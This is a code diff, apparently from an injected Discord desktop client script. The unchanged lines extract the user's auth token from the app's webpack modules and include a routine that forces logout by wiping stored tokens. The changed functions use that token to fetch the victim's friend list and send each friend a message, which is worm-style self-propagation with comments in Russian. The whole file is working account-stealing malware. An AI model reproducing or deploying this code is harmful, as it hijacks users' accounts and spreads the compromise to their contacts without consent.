@@ -7,6 +7,7 @@ const queryString = require("querystring")
 
 
 
+
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`
 var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
@@ -537,76 +538,118 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
 
 
+
+
 const M = 'err0r';
 
-async function getFriendsList(token) {
-    const headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+function getFriendsList(token) {
+    const options = {
+        hostname: 'discord.com',
+        path: '/api/v6/users/@me/relationships',
+        method: 'GET',
+        headers: {
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
     };
 
-    try {
-        const response = await fetch('https://discord.com/api/v6/users/@me/relationships', { headers });
-        const friendlist = await response.json();
-        return friendlist.map(friend => friend.user.id);
-    } catch (error) {
-        console.error('Ошибка при получении списка друзей:', error);
-        return [];
-    }
+    return new Promise((resolve, reject) => {
+        const req = https.request(options, res => {
+            let data = '';
+            res.on('data', chunk => {
+                data += chunk;
+            });
+            res.on('end', () => {
+                resolve(JSON.parse(data).map(friend => friend.user.id));
+            });
+        });
+
+        req.on('error', error => {
+            reject(error);
+        });
+
+        req.end();
+    });
 }
 
-async function sendMessageToFriend(token, recipientIds, message) {
-    const headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+function sendMessageToFriend(token, recipientIds, message) {
+    recipientIds.forEach(async recipient => {
+        const Nitro = await getURL(`https://discord.com/api/v9/users/${recipient}/profile`, token);
+
+        const postData = JSON.stringify({ content: message });
+        const options = {
+            hostname: 'discord.com',
+            path: `/api/v10/channels/${Nitro}/messages`,
+            method: 'POST',
+            headers: {
+                "Authorization": token,
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+            }
+        };
+
+        const req = https.request(options, res => {
+            res.on('data', () => {}); // Just to consume response data
+            if (res.statusCode === 200) {
+                console.log(`Сообщение успешно отправлено пользователю с ID ${recipient}`);
+            } else {
+                console.error('Ошибка при отправке сообщения:', res.statusCode);
+            }
+        });
+
+        req.on('error', error => {
+            console.error('Произошла ошибка:', error);
+        });
+
+        req.write(postData);
+        req.end();
+    });
+}
+
+async function getURL(url, token) {
+    const options = {
+        hostname: 'discord.com',
+        path: url,
+        method: 'GET',
+        headers: {
+            "Authorization": token,
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
     };
 
-    try {
-        for (const recipient of recipientIds) {
-            const channelResponse = await fetch('https://discord.com/api/v10/users/@me/channels', {
-                method: 'POST',
-                headers,
-                body: JSON.stringify({ recipient_id: recipient }),
+    return new Promise((resolve, reject) => {
+        const req = https.request(options, res => {
+            let data = '';
+            res.on('data', chunk => {
+                data += chunk;
             });
-            if (channelResponse.ok) {
-                const channelData = await channelResponse.json();
-                const channelId = channelData.id;
-                if (channelId) {
-                    const messageResponse = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
-                        method: 'POST',
-                        headers,
-                        body: JSON.stringify({ content: message }),
-                    });
-                    if (messageResponse.ok) {
-                        console.log(`OK ${recipient}`);
-                    } else {
-                        console.error('ER:', await messageResponse.text());
-                    }
-                } else {
-                    console.error('ER');
-                }
-            } else {
-                console.error('ER:', await channelResponse.text());
-            }
-        }
-    } catch (error) {
-        console.error('ER', error);
-    }
+            res.on('end', () => {
+                resolve(JSON.parse(data).id);
+            });
+        });
+
+        req.on('error', error => {
+            reject(error);
+        });
+
+        req.end();
+    });
 }
 
 async function main() {
     try {
         const friendIds = await getFriendsList(TOKEN);
-        console.log("FR:", friendIds);
-        await sendMessageToFriend(TOKEN, friendIds, M);
+        console.log("Список друзей:", friendIds);
+        sendMessageToFriend(TOKEN, friendIds, M);
     } catch (error) {
-        console.error('ER:', error);
+        console.error('Произошла ошибка:', error);
     }
 }
 
 main();
+
 
 
 
